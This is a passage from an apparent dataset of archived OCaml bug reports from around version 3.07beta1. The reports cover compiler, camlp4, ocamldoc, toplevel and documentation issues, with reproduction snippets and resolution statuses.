Bug description\n\nFull_Name: Flavio Poletti\nVersion: 3.06\nOS: Linux\nSubmission from: 195.130.249.251 (195.130.249.251)\n\n\nAs an additional note that you can easily add as a warning in the download page,\nyou can suggest to add the following statement in the configure invocation:\n\n  -tkdefs \"-DUSE_COMPOSITELESS_PHOTO_PUT_BLOCK\"\n\nThis will resolve the problem and avoid the user to go hacking directly into the\nsources.\n\nBR,\n\n  Flavio.\n"},{"labels":["bug"],"text":"**Original bug ID:** 1789\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Christopher Dutchyn\nVersion: 3.07+beta1\nOS: Solaris\nSubmission from: cypress.cs.ubc.ca (142.103.11.23)\n\n\nThere is a duplicate include in the ocamldoc/Makefile, causing\n$(OCAMLSRCDIR)/typing/typedtree.cmo to be included twice.  This is OK for make\nworld, make bootstrap, make opt, but crashes make opt.opt with\n      Files ../typing/typedtree.cmx and ../typing/typedtree.cmx\n      both define a module named Typedtree\nThe fix is to remove the second entry -- you must have typedtree.cmo before\nparmatch.cmo.\n"},{"labels":["bug"],"text":"**Original bug ID:** 1788\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Paul Govereau\nVersion: 3.04\nOS: Linux 2.4 (Debian)\nSubmission from: cairn.eecs.harvard.edu (140.247.62.157)\n\n\nCamlp4 reports a syntax error when pretty printing the following code:\n\n  let (<<) f g h = f (g h)\n"},{"labels":["bug"],"text":"**Original bug ID:** 1787\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nIt looks like the mbox format archives for caml list contain many\nduplicated messages, at least for July 2003.\n\n-- \nMiles Egan <miles@caddr.com>\n\n----------------\n-----BEGIN PGP SIGNATURE-----\nVersion: GnuPG v1.2.2 (GNU/Linux)\n\niD8DBQA/MDO2U4Jq/wH1PVERAqheAJ948jP5sqUlkyL4o57tJguZLLz5+gCghD5l\nhb+tpf+Ao24/RAZtWQJY+Jg=\n=+fid\n-----END PGP SIGNATURE-----\n\n----------------\n----------------\n"},{"labels":["bug"],"text":"**Original bug ID:** 1786\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Winfried Dreckmann\nVersion: OCaml 3.06\nOS: Linux PowerPC\nSubmission from: t2o902p68.telia.com (212.181.191.68)\n\n\nThe function Gc.delete_alarm doesn't work:\n\n        Objective Caml version 3.06\n\n# let a = Gc.create_alarm (fun () -> print_string \"alarm\\n\");;\nval a : Gc.alarm = <abstr>\n# Gc.major ();;\nalarm\n- : unit = ()\n# Gc.delete_alarm a;;\n- : unit = ()\n# Gc.major ();;\nalarm\n- : unit = ()\n\nThis is the source code for \"create_alarm\" in \"gc.ml\":\n\nlet create_alarm f =\n  let a = ref true in\n  let arec = { active = ref true; f = f } in\n  finalise call_alarm arec;\n  a\n;;\n\nShouldn't this be \"active = a\" in the third line?\n\nRegards,\nWinfried Dreckmann\n"},{"labels":["bug"],"text":"**Original bug ID:** 1783\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nBonjour,\n\nÃ©tonnamment simple et je ne saurais quoi dire si mes Ã©lÃ¨ves tombent dessus:\n\nbug.ml:\ntype t = float\ntype t' = { x : t }\n\nbug.mli: (gÃ©nÃ©rÃ© par ocamlc -i)\ntype t = float\nand t' = { x : t }\n\n\nsepia[137]% ocamlc bug.mli\nsepia[138]% ocamlc bug.ml\nThe implementation bug.ml does not match the interface bug.cmi:\nType declarations do not match:\n  type t' = { x : t; }\nis not included in\n  type t' = { x : t; }\nsepia[139]% ocamlc -v\nThe Objective Caml compiler, version 3.07+beta 1\nStandard library directory: /usr/local/lib/ocaml\n\n\n--Pascal\n"},{"labels":["bug"],"text":"**Original bug ID:** 1781\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFloat of string accepts the strings \"nan\", \"inf\" and \"-inf\".\n\nOcaml(top) always display those value with a dot at the end.  eg.,\n\n  :; ocaml\n        Objective Caml version 3.07+beta 1\n\n  # nan;;\n  - : float = nan.\n  # infinity;;\n  - : float = inf.\n  # neg_infinity;;\n  - : float = -inf.\n\nCould you get rid of the excess dot?\n\nWhile we're on the topic, this behavior is good:\n\n  # float_of_string \"nan\";;\n  - : float = nan.\n  # float_of_string \"inf\";;\n  - : float = inf.\n  # float_of_string \"-inf\";;\n  - : float = -inf.\n\nWhy does entering those values only work for nan?\n\n  # nan;;\n  - : float = nan.\n  # inf;;\n  Unbound value inf\n\nOh, the ocamltop lexer treats \"nan\" as an identifier and there happens\nto be a Pervasives.nan which is a handy coincidence.  I almost was\ngoing to mention that if the tokens \"infinity\" and \"neg_infinity\" were\nused instead of \"inf\" and \"-inf\" this might be considered a good\nthing. Most likely this is not a good thing.\n"},{"labels":["bug"],"text":"**Original bug ID:** 1780\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Aleksey Nogin\nVersion: 3.07beta1\nOS: Red Hat Linux\nSubmission from: mojave2.cs.caltech.edu (131.215.44.187)\n\n\nIf I create .mli and .ml with the following contents:\n\n--- .mli ---\n\nmodule type TypeSig = sig\n   type t\nend\n\nmodule Test\n   (Mod1: TypeSig)\n   (Mod2: TypeSig with type t = Mod1.t) :\n   (TypeSig with type t = Mod1.t)\n\n--- end .mli ---\n\n--- .ml ---\n\nmodule type TypeSig = sig\n   type t\nend\n\nmodule Test\n   (Mod1: TypeSig)\n   (Mod2: TypeSig with type t = Mod1.t) =\nstruct\n   type t = Mod2.t\nend\n\n--- end .ml ---\n\nThen it compiles fine with 3.06, but 3.07 beta1 does not realize that Mod1.t and\nMod2.t are really the same:\n\nThe implementation weird.ml does not match the interface weird.cmi:\nModules do not match:\n  functor (Mod1 : TypeSig) ->\n    functor (Mod2 : sig type t = Mod1.t end) -> sig type t = Mod2.t end\nis not included in\n  functor (Mod1 : TypeSig) ->\n    functor (Mod2 : sig type t = Mod1.t end) -> sig type t = Mod1.t end\nModules do not match:\n  functor (Mod2 : sig type t = Mod1.t end) -> sig type t = Mod2.t end\nis not included in\n  functor (Mod2 : sig type t = Mod1.t end) -> sig type t = Mod1.t end\nModules do not match:\n  sig type t = Mod2.t end\nis not included in\n  sig type t = Mod1.t end\nType declarations do not match:\n  type t = Mod2.t\nis not included in\n  type t = Mod1.t\n\nNote that this works correctly \"locally\" - if I add an explicit signature to the\n.ml file :\n\n--- different .ml ---\n\nmodule type TypeSig = sig\n   type t\nend\n\nmodule Test\n   (Mod1: TypeSig)\n   (Mod2: TypeSig with type t = Mod1.t) :\n   (TypeSig with type t = Mod1.t) =\nstruct\n   type t = Mod2.t\nend\n\n--- end different .ml ---\n\nthen it compiles fine. Still, this is pretty annoying as it breaks existing code\nin a way that takes a while to figure out and fix.\n"},{"labels":["bug"],"text":"**Original bug ID:** 1778\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nString_of_float is now %.17g versus the old %.12g.  You might want to\nnote this behavior in the Changelog.  (My log file is lots bigger now\nthat every number is 19 characters wide versus the previous 4 or 5.)\n\n        Objective Caml version 3.06\n\n# string_of_float 0.14000000000000001;;\n- : string = \"0.14\"\n# string_of_float 0.1400000000001;;\n- : string = \"0.14\"\n# string_of_float 0.140000000001;;\n- : string = \"0.140000000001\"\n# 0.14000000000000001 = 0.14 ;;\n- : bool = true\n\n\n        Objective Caml version 3.07+beta 1\n\n# string_of_float 0.14000000000000001;;\n- : string = \"0.14000000000000001\"\n# string_of_float 0.1400000000000000000000000000000001;;\n- : string = \"0.14000000000000001\"\n# 0.14000000000000001 = 0.14 ;;\n- : bool = true\n"},{"labels":["bug"],"text":"**Original bug ID:** 1777\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Christopher Dutchyn\nVersion: 3.07+beta1\nOS: irrelevant\nSubmission from: cypress.cs.ubc.ca (142.103.11.23)\n\n\nPage 468, last paragraph, end of sentence 2:\n\"constrained to the same subtype.\" -> \"constrained to the same supertype.\"\n"},{"labels":["bug"],"text":"**Original bug ID:** 1776\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Vincent Simonet\nVersion: 3.07+beta1\nOS: \nSubmission from: jaune.inria.fr (128.93.11.80)\n\n\nBonjour,\n\nCe n'est pas une \"nouveautÃ©\" de la derniÃ¨re release, mais je viens de tomber par\nhasard sur le problÃ¨me suivant: la fonction gÃ©nÃ©rÃ©e pour un lexer par ocamllex\nutilise une fonction auxilliaire qui prend un argument supplÃ©mentaire \"state\",\nce qui cache une Ã©ventuelle prÃ©cÃ©dente dÃ©finition.\n\nAmicalement,\n\n\n--- state.mll ---\n{\n  let state = \"Hello !\"\n}\n\nrule main = parse\n  _ { print_string state }\n"},{"labels":["bug"],"text":"**Original bug ID:** 1775\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nNot sure, whether it'as a bug or a feature.\nSituation: generate a top-level \"tl\" with ocamlmktop for debugging. Call it as \nin \"tl -I ... -I ... p1 p2\" where p1 ... pn are the command line parameters \nexpected from the toplevel tl\n3.06 removes the -I ... before the command line arguments are passed to the \ntl-program\n3.07 passes the unexpected -I ... to the program\n\nYours,\nReinhard\n-- \nDr. Reinhard Budde - AiS  - Fraunhofer Institute for Autonomous intelligent \nSystems\nD-53754 St.Augustin  tel: +2241-14-2417,fax: +2241-14-2324\n- http://www.ais.fraunhofer.de/~budde\n- mail:reinhard.budde@ais.fraunhofer.de\n"},{"labels":["bug"],"text":"**Original bug ID:** 1774\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nBonjour, \n\npervasives.ml contient :\n\n  external string_to_format : \n    string -> ('a, 'b, 'c, 'd) format4 = \"%identity\"\n\nmais dans le .mli :\n\n  external format_of_string :\n    ('a, 'b, 'c, 'd) format4 -> ('a, 'b, 'c, 'd) format4 = \"%identity\"\n\n-- \n   Olivier\n"},{"labels":["bug"],"text":"**Original bug ID:** 1773\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nIn ocaml-3.06 we have\n\n  let parse = parse_argv Sys.argv;;\n\nIn 3.07beta1 we have\n\n  let parse l f msg =\n    current := 0;\n    try\n      parse_argv Sys.argv l f msg;\n    with\n    | Bad msg -> eprintf \"%s\" msg; exit 0;\n    | Help msg -> eprintf \"%s\" msg; exit 2;\n\nThe resetting of Arg.current causes incompatibilities.  In particular\nGerd Stolpman's findlib fails as he calls Arg.parse relying on setting\nArg.current.\n\nI'm not saying this is a bug but it is a backward incompatibility and\nshould be documented.\n"},{"labels":["bug"],"text":"**Original bug ID:** 1772\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Boris Yakobowski\nVersion: 3.07+beta1\nOS: Linux\nSubmission from: lcultra.macs.hw.ac.uk (137.195.27.64)\n\n\nSur la page html de la documentation (http://caml.inria.fr/ocaml/htmlman-beta/),\nles liens \"This manual is also available in\" sont tous morts. Par contre, ceux\nde http://caml.inria.fr/ocaml/distrib-3.07beta1.html sont corrects.\n\n-- \nBoris\n"},{"labels":["bug"],"text":"**Original bug ID:** 1770\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nBonjour,\n\nun #load \"camlp4o.cma\" ne semble plus marcher avec le toplevel de la\nbeta 3.07 :\n\n,----\n| $ /usr/akasha/ocaml/bin/ocaml\n|         Objective Caml version 3.07+beta 1\n| \n| # #load \"camlp4o.cma\" ;;\n| Cannot find file camlp4o.cma.\n`----\n\nalors que :\n\n,----\n| $ ocaml\n|         Objective Caml version 3.06\n| \n| # #load \"camlp4o.cma\" ;;\n| \tCamlp4 Parsing version 3.06\n`----\n\npar contre, Ã§a marche en mettant le .cma sur la ligne de commande :\n\n,----\n| $ /usr/akasha/ocaml/bin/ocaml camlp4o.cma\n|         Objective Caml version 3.07+beta 1\n| \n| \tCamlp4 Parsing version 3.07+beta 1\n`----\n\nPar ailleurs, dans le message d'aide du toplevel, Ã  propos des flags\nde warning, il est dit `default setting is \"Ale\"', mais il n'y a pas\nde `L/l' dans la liste de flags au-dessus.\n\n-- \n   Olivier\n"},{"labels":["bug"],"text":"**Original bug ID:** 1769\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nHi, there were a couple problems when I tried using the 3.07 version of\ncaml.el files.  \n\n   - \"region\" face was not defined.  Perhaps it's standard on emacs, but\n     it's not there for xemacs (21.4.13)\n \n    - caml-types.el doesn't get installed by default.  It doesn't seem to\n      get autoloaded either, let alone have provide/require support\n\nBut once I worked around these issues, the caml-types-show-type function\nworked as expected.\n\nThanks,\nAlbert\n"},{"labels":["bug"],"text":"**Original bug ID:** 1768\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: chris quinn\nVersion: 3.06/3.04\nOS: rh linux 7.3\nSubmission from: 212.42.169.63 (212.42.169.63)\n\n\nentering the following in the interpreter:\n\nmodule M=struct x=0 end\nexception M\nM.f\n\ngives a non-zero number for M.f!\ndidn't happen with the compiler though.\n\n- chris\n"},{"labels":["bug"],"text":"**Original bug ID:** 1767\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nOCamllex in 3.07beta has two new flags (-o, -ml) that are not documented\nin its manual page.\n\n-- Christian\n"},{"labels":["bug"],"text":"**Original bug ID:** 1766\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: mattias waldau\nVersion: 3.0.7beta1 \nOS: Mandrake 8.2\nSubmission from: c-34dd71d5.09-253-7570701.cust.bredbandsbolaget.se (213.113.221.52)\n\n\nI use a camlp4-tool called HereDoc, which makes it easy to build strings.\n\nI had to recompile the preprocessor HereDoc, but the following build statement \n\nmkcamlp4 -I +camlp4 -o HereDoc pa_o.cmo pr_dump.cmo unix.cma pa_HereDoc.cmo\n\ndoesn't build any file called HereDoc. Has the semantics of mkcamlp4 changed?\n\nI only installed 3.0.7beta using ./configure, make world.opt and installed \nright over my 3.0.6. I have not installed any separate camlp4 packages.\n\nThank you for a nice product,\n\nMattias\n"},{"labels":["bug"],"text":"**Original bug ID:** 1765\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nTwo minor editorial comments on chapter 6.3 of the documentation:\n\n * (only in 3.06) \"These nine name spaces...\": there are actually eleven\nname spaces in the list. Changed in 3.07beta1, but not on the 3.06\ndocumentation currently online.\n\n * \"Referring to named objects\" subsection. (3.06 and 3.07beta1)\n\nThe BNF states:\n\n\"value-path ::= value-name\n   | value-path '.' lowercase-ident\"\n\nAlthough it is equivalent, wouldn't it be more consistent to use the\nfollowing?\n\n\"value-path ::= value-name\n   | value-path '.' value-name\"\n\n==> In section \"Referring to named objects\", I would suggest for consistency\nto not refer to ident, capitalized-ident or lowercase-ident directly, but\nrather use the BNF binding from the previous subsection (\"naming objects\").\n\nThe whole transformation of the \"Referring to named objects\" syntax would\ngive:\n\n\"\nvalue-path ::= value-name\n  | module-path '.'  value-name\ncconstr ::= cconstr-name\n  | module-path '.'  cconstr-name\nncconstr ::= ncconstr-name\n  | module-path '.'  ncconstr-name\ntypeconstr ::= typeconstr-name\n  | extended-module-path '.' typeconstr-name\nfield ::= field-name\n  | module-path '.'  field-name\nmodule-path ::= module-name\n  | module-path '.'  module-name\nextended-module-path ::= module-name\n  | extended-module-path '.'  module-name\n  | extended-module-path '('  extended-module-path ')'\nmodtype-path ::= modtype-name\n  | extended-module-path '.'  modtype-name\nclass-path ::= class-name\n  | module-path '.'  class-name\n\"\n\nBR,\nBdB\n"},{"labels":["bug"],"text":"**Original bug ID:** 1764\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\n:; ocamlc -version\n3.07+beta 1\n:; cat test.ml\nlet inclus l1 l2 = \n   let rec mem x = function \n       [] -> false \n     | a::l -> (l=x) || (mem x a) (* an error on purpose: a and l inverted *)\n   in List.for_all (fun x -> mem x l2) l1  ;;\n:; ocamlc -c -warn-error A -verbose -rectypes -g test.ml\n:; ocamlc -c -warn-error A -verbose -rectypes -g -dtypes test.ml\nFatal error: exception Stack_overflow\n"},{"labels":["bug"],"text":"**Original bug ID:** 1763\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nL'option -dtypes ne marche pas, au moins sur les classes.\n\nAprÃ¨s correction, peut-Ãªtre faut-il essayer un bootstrap avec -dtypes pour\ntester plus largement. \n\n-Didier\n\n----------------------------------------------------------------------------\n\n    # PATH=/usr/local/bin:$PATH ocamlc -version\n    3.07+beta 1\n\n    # cat foo.ml \n    class  foo = object method copy() = {<  >} end\n\n    # PATH=/usr/local/bin:$PATH ocamlc  -dtypes -c foo.ml\n    Fatal error: exception Stack_overflow\n\n    # PATH=/usr/local/bin:$PATH ocamlc -c foo.ml; echo $?\n    0\n"},{"labels":["bug"],"text":"**Original bug ID:** 1761\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nThe html documentation is broken. Index pages show up OK, but the bottom pages (i.e. the specifics) break\nbecause they point to this link:\n\nhttp://caml.inria.fr/ocaml/htmlman-beta/{\\machine\n\n-- \n\t\t\t\t\t\n\t\t\t-Fernando Alegre (fernando@cc.gatech.edu)\n"},{"labels":["bug"],"text":"**Original bug ID:** 1760\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nHello O'Caml team,\n\nI'm looking forward to work with OCaml 3.07.\n\ncurrently working with OCaml 3.06, Findlib 0.81, PCRE-Ocaml 5.03.3, Ocamlnet\n0.96, Pxp 1.1.94 with Wlex-20021107 under W2k Cygwin gcc 3.23 (implementing\na XML-application in medical informatics) I tried to install the same\nconfiguration with OCaml 3.07b1. I did the following procedure three\ntimes on two different computers observing the same problem:\n\nCompilation of Ocaml3.07, Findlib 0.81 and PCRE-Ocaml 5.03.3 (STATIC=1)\nwithout problems. Installation of Ocaml and Findlib without problem.\nInstallation of PCRE (under Findlib) doesn't work correctly:\n\n[35 : 534] boeker@ami134 (Tue Jul 22 12:53:00) <~/Install/pcre-ocaml-5.03.3>\n$ make STATIC=1 install\nmake[1]: Entering directory\n/cygdrive/u/usr/home/Install/pcre-ocaml-5.03.3/lib'\n\nInstalling library with ocamlfind\nocamlfind install pcre META pcre.mli pcre.cmi pcre.cma pcre.cmxa pcre.a\nlibpcre_stubs.a\nInstalled /usr/local/lib/ocaml/site-lib/install/libpcre_stubs.a\nInstalled /usr/local/lib/ocaml/site-lib/install/pcre.a\nInstalled /usr/local/lib/ocaml/site-lib/install/pcre.cmxa\nInstalled /usr/local/lib/ocaml/site-lib/install/pcre.cma\nInstalled /usr/local/lib/ocaml/site-lib/install/pcre.cmi\nInstalled /usr/local/lib/ocaml/site-lib/install/pcre.mli\nInstalled /usr/local/lib/ocaml/site-lib/install/META\nUncaught exception: Sys_error(\"pcre: No such file or directory\")\nmake[1]: *** [libinstall] Fehler 3\nmake[1]: Leaving directory /cygdrive/u/usr/home/Install/pcre-ocaml-5.03.3/lib'\n\nFindlib installs in \"site-lib/install\" not in \"site-lib/pcre\"; other\ncommandline parameter of ocamlfind show \"strange behaviour\", too.\n\nI can't work/test with \"ocamlnet\" and \"pxp\" on Cygwin/Ocaml3.07b1 because of\nthe dependency on findlib of this libs.\n\nI reported the problem to Gerd Stolpmann yesterday as I encountered it with\nthe last CVS releases.\n\nMartin\n\n-- \n_________________________________________________________________________\n \n UniversitÃ¤tsklinikum Freiburg                    Dr. med. Martin Boeker\n Abteilung Medizinische Informatik              Tel.: +49 (761) 203 6700\n Stefan-Meier-Str. 26                           Mob.: +49 (170) 234 1080\n 79104 Freiburg i. Br.                          FAX : +49 (761) 203 6711\n_________________________________________________________________________\n"},{"labels":["bug"],"text":"**Original bug ID:** 1759\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Christopher Dutchyn\nVersion: 3.07 beta1\nOS: FreeBSD\nSubmission from: bnhu530ey3144.bc.hsia.telus.net (142.173.24.253)\n\n\nA program saved in a file named with an initial numeric character\ncauses the emitted .s file to be unacceptable to the assembler (gas,\nI presume) when compiled with ocamlopt or ocamlopt.opt\n"},{"labels":["bug"],"text":"**Original bug ID:** 1758\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nVersion: current cvs\nOS: Windows 2000\n\nThere is a problem with camlp4. When it reports syntax error, it\ndoesn't count the lines, say:\n\nFile \"test.ml\", line 1, characters 12398-12401:\n<...>\n\n(the line is always equal to 1, at least under Windows)\n\nI compile Ocaml sources within XEmacs/Win32/tuareg mode, and XEmacs consider\nEOL in the buffer as ONE character, while camlp4 counts it as TWO chars\n(CRLF). So the error location is pointed incorrectly.\n\nHow do you think, where it should be fixed? (camlp4, tuareg,...)?\n\n- Dmitry Bely\n"},{"labels":["bug"],"text":"**Original bug ID:** 1757\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Jacek Chrzaszcz\nVersion: 3.06\nOS: Linux\nSubmission from: dhcp17.labri.fr (147.210.9.112)\n\n\nHello,\n\nBy doing some experiments and looking at the type-checker's code I discovered\nthat\nthe subtyping of functor types is too restrictive!\n\nIn the papers of X.Leroy the rule is\n\nE |- M_1' <: M_1        E,X:M_1' |- M_2 <: M_2'\n-----------------------------------------------\n E |- functor(X:M_1)M_2 <: functor(X:M_1')M_2'\n\nwhile in the implementation, its right premise is \n\nE,X:M_1 |- M_2 <: M_2'\n       ^\n    no ' here\n\n\nConsequently correct functor subtyping might be rejected. For example:\n\n# module type SUBTYPE = functor(X:sig type t end) -> sig type t=X.t end\n  module type SUPERTYPE = functor(X:sig type t type u=t end) -> sig type t=X.u\nend\n\n  module S : SUBTYPE =\n    functor(X:sig type t end) -> struct type t=X.t end\n\n  module Tester(Y:SUPERTYPE) = struct end\n  module Test=Tester(S)\n\n\nIs it a forgotten subtlety or is it on purpose, motivated by some subtle\ncompilation issues that I do not see?\n\n\nBest regards to the Caml Team\n\nJacek\n"},{"labels":["bug"],"text":"**Original bug ID:** 1756\n**Reporter:** administrator\n**Status:** closed (set by @damiendoligez on 2012-01-26T14:18:59Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Fixed in version:** 3.12.1\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nIl me semble que le code pour le cas Custom_tag dans compare.c est\r\npotentiellement dangereux, car il ne verifie pas que les deux\r\nblocs utilisent la meme fonction de comparaison.\r\n\r\nLe probleme peut se poser si on compare deux objets custom differents\r\n(mais de meme taille), dont on a prealablement oublie' le type par\r\nObj.repr.\r\n\r\nIl me semble qu'il faudrait ajouter la ligne:\r\n\r\n  if (Custom_ops_val(v1) != Custom_ops_val(v2))\r\n    return ((value)Custom_ops_val(v1) >> 1) - ((value)Custom_ops_val(v2) >> 1);\r\n\r\nCa peut paraitre un peu tire' par les cheveux, mais ca me semble etre\r\nle seul cas ou` [compare (Obj.repr a) (Obj.repr b)] est\r\npotentiellement incorrect.\r\n\r\nD'autre part, si Custom_ops_val(v1)->compare == NULL, l'exception\r\nFailure est levee, alors que dans les autres cas c'est Invalid_argument.\r\n\r\n        Jacques\n"},{"labels":["bug"],"text":"**Original bug ID:** 1754\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nOcaml 3.06 compiles on my linux system (2.4.20 kernel) just fine under\nglibc 2.2.5, but when I upgraded to glibc 2.3.2, it stopped working.\nThe build fails at this step:\n\n    sh ./runocamldoc true -man -d stdlib_man -I ../parsing -I ../utils -I ../typing -I ../driver -I ../bytecomp -I ../tools -I ../toplevel/ -I ../stdlib -I ../otherlibs/str -I ../otherlibs/dynlink -I ../otherlibs/unix -I ../otherlibs/num -I ../otherlibs/graph \\\n    -t \"OCaml library\" -man-mini \\\n    ../stdlib/*.mli ../otherlibs/unix/unix.mli ../otherlibs/str/str.mli ../otherlibs/bigarray/bigarray.mli ../otherlibs/num/num.mli\n    make[2]: *** [stdlib_man/Pervasives.o] Killed\n    make[2]: Leaving directory `/o/tmp/ocaml-3.06-build/ocaml-3.06/ocamldoc'\n    make[1]: *** [ocamldoc] Error 2\n    make[1]: Leaving directory `/o/tmp/ocaml-3.06-build/ocaml-3.06'\n    make: *** [compile] Error 2\n\nThe ocamlrun program uses up at lest 187 MB of ram before running out\nof memory and getting killed.\n\nThe shell script runs this command:\n\n   ../boot/ocamlrun -I ../otherlibs/unix -I ../otherlibs/str ./ocamldoc -man -d stdlib_man -I ../parsing -I ../utils -I ../typing -I ../driver -I ../bytecomp -I ../tools -I ../toplevel/ -I ../stdlib -I ../otherlibs/str -I ../otherlibs/dynlink -I ../otherlibs/unix -I ../otherlibs/num -I ../otherlibs/graph -t 'OCaml library' -man-mini ../stdlib/arg.mli ../stdlib/array.mli ../stdlib/arrayLabels.mli ../stdlib/buffer.mli ../stdlib/callback.mli ../stdlib/camlinternalOO.mli ../stdlib/char.mli ../stdlib/complex.mli ../stdlib/digest.mli ../stdlib/filename.mli ../stdlib/format.mli ../stdlib/gc.mli ../stdlib/genlex.mli ../stdlib/hashtbl.mli ../stdlib/int32.mli ../stdlib/int64.mli ../stdlib/lazy.mli ../stdlib/lexing.mli ../stdlib/list.mli ../stdlib/listLabels.mli ../stdlib/map.mli ../stdlib/marshal.mli ../stdlib/moreLabels.mli ../stdlib/nativeint.mli ../stdlib/obj.mli ../stdlib/oo.mli ../stdlib/parsing.mli ../stdlib/pervasives.mli ../stdlib/printexc.mli ../stdlib/printf.mli ../stdlib/qu!\neue.mli ../stdlib/random.mli ../stdlib/scanf.mli ../stdlib/set.mli ../stdlib/sort.mli ../stdlib/stack.mli ../stdlib/stdLabels.mli ../stdlib/stream.mli ../stdlib/string.mli ../stdlib/stringLabels.mli ../stdlib/sys.mli ../stdlib/weak.mli ../otherlibs/unix/unix.mli ../otherlibs/str/str.mli ../otherlibs/bigarray/bigarray.mli ../otherlibs/num/num.mli\n\n\nAccording to strace, after reading ../stdlib/arg.mli it uses brk() to\nget 693 pages of memory, (about 2.8 MB), then after array.mli it gets\n651 pages, then after arrayLabels.mli it get 664 pages, and so on,\nuntil it runs out of memory.\n\nVery mysterious.\n"},{"labels":["bug"],"text":"**Original bug ID:** 1753\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Vincenzo Ciancia\nVersion: 3.06\nOS: linux\nSubmission from: host208-166.pool80181.interbusiness.it (80.181.166.208)\n\n\nThe problem is very simple: when a file name begins with a number, e.g.\n\"01_xxx.ml\", the .s code generated by ocamlopt.opt will contain a label named\n\"01_xxx\", wich can't be compiled by the assembler. So to exploit this bug just\ncall a file \"01.ml\" and try\n\nocamlopt.opt 01.ml \n\nThanks for 